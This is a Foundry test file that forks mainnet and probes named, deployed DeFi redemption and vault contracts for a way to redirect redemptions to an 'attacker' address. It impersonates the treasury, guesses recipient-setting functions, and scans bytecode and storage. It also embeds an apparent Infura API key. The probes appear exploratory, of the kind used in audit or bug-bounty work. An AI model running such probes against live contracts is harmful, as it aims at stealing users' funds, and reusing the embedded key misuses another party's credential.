// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
}

interface IRedemption {
    function redeem(uint96 amount) external;
    function finalizeRedeem(uint256 index) external;
    function getRedeemLength(address user) external view returns (uint256);
    function getRedeemInfo(address user, uint256 index) external view returns (uint96, uint64, bool);
}

// "Action Chaining" pattern hypothesis:
// 1. Extract assets to a proxy attacker owns
// 2. Extract from that proxy
//
// This suggests there's a way to make REDEMPTION call RC.redeem
// with assets going to a contract the attacker controls

contract ProxyActionChain is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;
    address constant TASSET = 0xE00bd3Df25fb187d6ABBB620b3dfd19839947b81;

    // Treasury Safe that might have special permissions
    address constant TREASURY = 0xb6C71AaF9bf23D545FEF08a40f8a8aC95FBF9dAE;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_MapAllRedemption0Functions() public {
        console.log("=== MAPPING ALL REDEMPTION_0 FUNCTIONS ===\n");

        // Get all selectors that return data (view functions)
        bytes4[] memory viewSelectors = new bytes4[](20);
        viewSelectors[0] = bytes4(keccak256("owner()"));
        viewSelectors[1] = bytes4(keccak256("pendingOwner()"));
        viewSelectors[2] = bytes4(keccak256("paused()"));
        viewSelectors[3] = bytes4(keccak256("VAULT()"));
        viewSelectors[4] = bytes4(keccak256("REDEMPTION_CONTROLLER()"));
        viewSelectors[5] = bytes4(keccak256("IAU()"));
        viewSelectors[6] = bytes4(keccak256("TASSET()"));
        viewSelectors[7] = bytes4(keccak256("treasury()"));
        viewSelectors[8] = bytes4(keccak256("waitingPeriod()"));
        viewSelectors[9] = bytes4(keccak256("minRedeemInUnderlying()"));
        viewSelectors[10] = bytes4(keccak256("totalRedeeming()"));
        viewSelectors[11] = bytes4(keccak256("redemptionFee()"));
        viewSelectors[12] = bytes4(keccak256("cap()"));
        viewSelectors[13] = bytes4(keccak256("epochCap()"));
        viewSelectors[14] = bytes4(keccak256("currentEpoch()"));
        viewSelectors[15] = bytes4(keccak256("conversionRate()"));
        viewSelectors[16] = bytes4(keccak256("protocolFeeRecipient()"));
        viewSelectors[17] = bytes4(keccak256("feeRecipient()"));
        viewSelectors[18] = bytes4(keccak256("rewardToken()"));
        viewSelectors[19] = bytes4(keccak256("underlying()"));

        console.log("REDEMPTION_0 view function results:");
        for (uint i = 0; i < viewSelectors.length; i++) {
            (bool s, bytes memory d) = REDEMPTION_0.staticcall(
                abi.encodeWithSelector(viewSelectors[i])
            );
            if (s && d.length >= 32) {
                // Try to decode as address first, then uint256
                if (d.length == 32) {
                    uint256 val = abi.decode(d, (uint256));
                    if (val != 0) {
                        if (val > 1e14 && val < 1e30) {
                            console.log("Function", i, "returned uint256:", val);
                        } else {
                            address addr = address(uint160(val));
                            if (addr.code.length > 0 || val == 1) {
                                console.log("Function", i, "returned addr:", addr);
                            } else {
                                console.log("Function", i, "returned:", val);
                            }
                        }
                    }
                }
            }
        }
    }

    function test_FindTreasuryConnection() public {
        console.log("=== FINDING TREASURY CONNECTION ===\n");

        // Check if Treasury is stored in REDEMPTION_0/1
        console.log("REDEMPTION_0 storage scan for Treasury:");
        for (uint i = 0; i < 20; i++) {
            bytes32 slot = vm.load(REDEMPTION_0, bytes32(i));
            address addr = address(uint160(uint256(slot)));
            if (addr == TREASURY) {
                console.log("  TREASURY found at slot", i);
            }
        }

        console.log("\nREDEMPTION_1 storage scan for Treasury:");
        for (uint i = 0; i < 20; i++) {
            bytes32 slot = vm.load(REDEMPTION_1, bytes32(i));
            address addr = address(uint160(uint256(slot)));
            if (addr == TREASURY) {
                console.log("  TREASURY found at slot", i);
            }
        }

        // Try calling functions as Treasury
        console.log("\nTrying functions as TREASURY:");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        vm.startPrank(TREASURY);

        // Try finalizeRedeem
        (bool s1, bytes memory d1) = REDEMPTION_0.call(
            abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
        );
        console.log("REDEMPTION_0.finalizeRedeem as Treasury:", s1);

        // Try RC.redeem directly
        (bool s2, bytes memory d2) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker)
        );
        console.log("RC.redeem as Treasury:", s2);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault change:", int256(vaultAfter) - int256(vaultBefore));
    }

    function test_ExploreRedemption0Callbacks() public {
        console.log("=== EXPLORING REDEMPTION_0 CALLBACKS ===\n");

        // Maybe there's a callback pattern that runs code in REDEMPTION context
        // This would allow calling RC.redeem as REDEMPTION_0

        bytes memory code = REDEMPTION_0.code;

        // Look for CALL patterns
        uint callCount = 0;
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf1) callCount++;
        }
        console.log("CALL count in REDEMPTION_0:", callCount);

        // Look for calls to external contracts that might have callbacks
        // Search for wstETH address in bytecode
        bytes memory wstETHBytes = abi.encodePacked(wstETH);
        console.log("\nSearching for wstETH in REDEMPTION_0 bytecode:");
        for (uint i = 0; i + 20 < code.length; i++) {
            bool match_ = true;
            for (uint j = 0; j < 20 && match_; j++) {
                if (code[i + j] != wstETHBytes[j]) match_ = false;
            }
            if (match_) {
                console.log("  Found wstETH at offset:", i);
            }
        }

        // Search for IAU address
        bytes memory iauBytes = abi.encodePacked(IAU);
        console.log("\nSearching for IAU in REDEMPTION_0 bytecode:");
        for (uint i = 0; i + 20 < code.length; i++) {
            bool match_ = true;
            for (uint j = 0; j < 20 && match_; j++) {
                if (code[i + j] != iauBytes[j]) match_ = false;
            }
            if (match_) {
                console.log("  Found IAU at offset:", i);
            }
        }
    }

    function test_InvestigateRedeemRecipientParam() public {
        console.log("=== INVESTIGATING REDEEM RECIPIENT PARAM ===\n");

        // Key insight: RC.redeem(amount, to) - "to" can be ANY address
        // When REDEMPTION calls RC.redeem, what address does it pass as "to"?

        // If REDEMPTION allows attacker to specify the recipient, that's the bug!

        // Look for functions in REDEMPTION_0 that take an address parameter
        vm.startPrank(attacker);

        console.log("Trying functions that might set redemption recipient:");

        // Try setRecipient
        (bool s1,) = REDEMPTION_0.call(
            abi.encodeWithSignature("setRecipient(address)", attacker)
        );
        console.log("setRecipient:", s1);

        // Try setTo
        (bool s2,) = REDEMPTION_0.call(
            abi.encodeWithSignature("setTo(address)", attacker)
        );
        console.log("setTo:", s2);

        // Try redeemTo
        (bool s3,) = REDEMPTION_0.call(
            abi.encodeWithSignature("redeemTo(uint96,address)", uint96(1e18), attacker)
        );
        console.log("redeemTo:", s3);

        // Try redeemFor
        (bool s4,) = REDEMPTION_0.call(
            abi.encodeWithSignature("redeemFor(address,uint96)", attacker, uint96(1e18))
        );
        console.log("redeemFor:", s4);

        // Try finalizeRedeemTo
        (bool s5,) = REDEMPTION_0.call(
            abi.encodeWithSignature("finalizeRedeemTo(uint256,address)", 0, attacker)
        );
        console.log("finalizeRedeemTo:", s5);

        // Try claim with address
        (bool s6,) = REDEMPTION_0.call(
            abi.encodeWithSignature("claim(address)", attacker)
        );
        console.log("claim(address):", s6);

        vm.stopPrank();
    }

    function test_AnalyzeRCRedeemCall() public view {
        console.log("=== ANALYZING HOW REDEMPTION CALLS RC.REDEEM ===\n");

        // RC.redeem selector = 0x7bde82f2
        bytes4 rcRedeemSel = bytes4(keccak256("redeem(uint256,address)"));
        console.log("RC.redeem selector:");
        console.logBytes4(rcRedeemSel);

        bytes memory r0Code = REDEMPTION_0.code;

        // Find where RC.redeem is called
        console.log("\nSearching for RC.redeem selector in REDEMPTION_0:");
        for (uint i = 0; i + 4 < r0Code.length; i++) {
            if (uint8(r0Code[i]) == 0x63) { // PUSH4
                bytes4 sel = bytes4(bytes.concat(r0Code[i+1], r0Code[i+2], r0Code[i+3], r0Code[i+4]));
                if (sel == rcRedeemSel) {
                    console.log("  Found at offset:", i);

                    // Look at what happens after - find CALL
                    for (uint j = i; j < i + 200 && j < r0Code.length; j++) {
                        if (uint8(r0Code[j]) == 0xf1) {
                            console.log("  CALL at:", j);

                            // The parameters on stack before CALL are:
                            // gas, addr, value, argsOffset, argsLength, retOffset, retLength
                            // The "to" address in redeem(amount, to) comes from stack

                            // Look for what address is being passed
                            // If it's a CALLER (0x33) nearby, that might be exploitable
                            for (uint k = i; k < j; k++) {
                                if (uint8(r0Code[k]) == 0x33) {
                                    console.log("  CALLER at:", k);
                                }
                                if (uint8(r0Code[k]) == 0x32) {
                                    console.log("  ORIGIN at:", k);
                                }
                                if (uint8(r0Code[k]) == 0x54) {
                                    console.log("  SLOAD at:", k);
                                }
                            }
                            break;
                        }
                    }
                }
            }
        }
    }

    function test_CheckPendingRedeems() public view {
        console.log("=== CHECKING PENDING REDEEMS ===\n");

        // Maybe there are existing pending redeems we can finalize
        // and redirect the output?

        IRedemption r0 = IRedemption(REDEMPTION_0);
        IRedemption r1 = IRedemption(REDEMPTION_1);

        // Check if any known addresses have pending redeems
        address[] memory candidates = new address[](10);
        candidates[0] = VAULT;
        candidates[1] = TREASURY;
        candidates[2] = 0x60d2D94aCB969CA54e781007eE89F04c1A2e5943; // Strategy 0
        candidates[3] = 0x5aE0e44DE96885702bD99A6914751C952d284938; // Strategy 1
        candidates[4] = 0xB27D688Ac06a441c005657971B11521e80CdcE98; // Strategy 2
        candidates[5] = 0xbfdF0aF6Df48E645Bd076802B95DDEf0b1E02a9d; // Strategy 3
        candidates[6] = REDEMPTION_CONTROLLER;
        candidates[7] = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e; // Timelock
        candidates[8] = address(0);
        candidates[9] = address(1);

        console.log("Checking pending redeems in REDEMPTION_0:");
        for (uint i = 0; i < candidates.length; i++) {
            if (candidates[i] == address(0)) continue;
            try r0.getRedeemLength(candidates[i]) returns (uint256 len) {
                if (len > 0) {
                    console.log("  Address has pending:", candidates[i]);
                    console.log("    Count:", len);

                    for (uint j = 0; j < len; j++) {
                        (uint96 amount, uint64 timestamp, bool finalized) = r0.getRedeemInfo(candidates[i], j);
                        if (!finalized) {
                            console.log("    Redeem", j, "- Amount:", amount / 1e18);
                            console.log("      Timestamp:", timestamp);
                        }
                    }
                }
            } catch {}
        }

        console.log("\nChecking pending redeems in REDEMPTION_1:");
        for (uint i = 0; i < candidates.length; i++) {
            if (candidates[i] == address(0)) continue;
            try r1.getRedeemLength(candidates[i]) returns (uint256 len) {
                if (len > 0) {
                    console.log("  Address has pending:", candidates[i]);
                    console.log("    Count:", len);
                }
            } catch {}
        }
    }

    function test_StorageBasedRecipient() public view {
        console.log("=== CHECKING STORAGE-BASED RECIPIENT ===\n");

        // The "to" address in RC.redeem might come from storage
        // Let's see what storage slots contain addresses

        console.log("REDEMPTION_0 storage (potential recipient slots):");
        for (uint i = 0; i < 30; i++) {
            bytes32 slot = vm.load(REDEMPTION_0, bytes32(i));
            if (slot != bytes32(0)) {
                address addr = address(uint160(uint256(slot)));
                console.log("Slot", i, ":");
                console.logBytes32(slot);
                if (addr.code.length > 0) {
                    console.log("  -> Contract at:", addr);
                }
            }
        }
    }
}
